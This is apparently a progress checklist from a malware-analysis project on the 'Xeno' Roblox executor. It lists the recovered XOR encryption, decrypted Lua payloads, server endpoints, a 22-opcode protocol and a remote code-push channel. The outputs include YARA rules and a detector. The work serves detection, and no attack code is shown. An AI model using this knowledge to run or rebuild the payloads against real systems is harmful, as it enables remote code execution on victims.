- ✅ **Resource encryption** — repeating 32-byte XOR (key recovered, §8.1); both payloads decrypted and decompressed (`payloads/xeno_client.lua`, `payloads/xeno_payload2.lua`).
- ✅ **Full `Xeno` Luau env** — ~160 UNC functions enumerated from `CLIENT.LUA` (see FINDINGS §9b).
- ✅ **Server protocol** — endpoints `/f?e=` and `/rq?`, and the complete 22-opcode `XFS` table (§9).
- ✅ **Attach target & execute loop** — `en-us` translation module + `ExecutionListener` require-loop (§8.2).
- ✅ **Remote channels** — `code.lua` (push RCE), `version.txt` (update check), `ep.zst.enc` (offsets).
- ⚠️ **Still open:** the exact *primary* RBXClient-data endpoint URL (not present as a plain string; likely assembled or fetched via the pastebin), and the pastebin's exact role. Both would need a quick dynamic run (curl the pastebin in a sandbox) — left as an exercise on purpose.

Artifacts produced: `tools/decrypt_resources.py` (standalone decryptor), `payloads/xeno_client.lua`, `payloads/xeno_payload2.lua`, `tools/xeno_executor.yar` (YARA pack), `tools/xeno_detector.py` (PE scanner), `docs/DETECTION.md` (detection engineering guide).
